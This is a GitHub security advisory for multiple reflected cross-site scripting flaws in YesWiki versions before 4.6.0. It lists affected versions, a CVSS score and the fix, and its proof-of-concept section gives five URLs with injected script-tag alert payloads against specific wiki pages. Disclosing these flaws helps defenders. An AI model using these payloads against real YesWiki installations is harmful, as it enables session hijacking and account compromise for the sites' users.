# [M] YesWiki has Multiple Reflected Cross-site Scripting Vulnerabilities

## Summary
Severity: Medium
Advisory: GHSA-5724-x3rh-5qqq
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-5724-x3rh-5qqq
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0 <4.6.0

## Details
### Summary

Multiple **reflected Cross-site Scripting (XSS)** vulnerabilities across both **authenticated and unauthenticated** portions of the application. These findings present a significant security risk, as they can be leveraged to execute arbitrary JavaScript in a victim’s browser under various contexts.

## Impact and Exploitation

While XSS is often treated as a standalone issue, these vulnerabilities have broader implications. Specifically, they can be used as **launch points to exploit other significant vulnerabilities**. 

Proof of concept links follow. All testing was performed on my local docker setup running the lastest version of the application. 

## Proof of Concepts

## Authenticated Reflected XSS

```
http://localhost:8085/?ElizabethJFeinler/deletepage&incomingurl=%22%3E%3Cscript%3Ealert(1)%3C%2fscript%3E
```

```
http://localhost:8085/?BazaR&vue=saisir&action=saisir_fiche&id=%3Cscript%3Ealert(1)%3C%2fscript%3E
```

```
http://localhost:8085/?GererThemes/upload&file=%3Cscript%3Ealert(1)%3C/script%3E
```

## Unauthenticated Reflected XSS


```
http://localhost:8085/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```

In this one, most of the parameters can be used to deliver an XSS payload, not just the template parameter. 

```
http://localhost:8085/?BazaR/bazariframe&id=2&template=<script>alert(1)</script>&width=100%25&height=600px&lat=46.22763&lon=2.213749&markersize=big&provider=MapBox&zoom=5&groups=&titles=&groupsexpanded=false
```

### Impact

The reflected XSS vulnerabilities identified pose a significant risk to both application integrity and user safety. When combined with other issues discovered such as insecure endpoints or improper authentication mechanisms. These XSS flaws can be leveraged to escalate access, hijack sessions, and in some cases, achieve remote code execution (RCE). For example, malicious JavaScript executed via XSS could be used to trigger authenticated requests that exploit backend vulnerabilities, ultimately allowing an attacker to execute arbitrary commands on the server or pivot deeper into the environment.

### Mitigation
Update to version 4.6.0

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-5724-x3rh-5qqq
- https://github.com/YesWiki/yeswiki
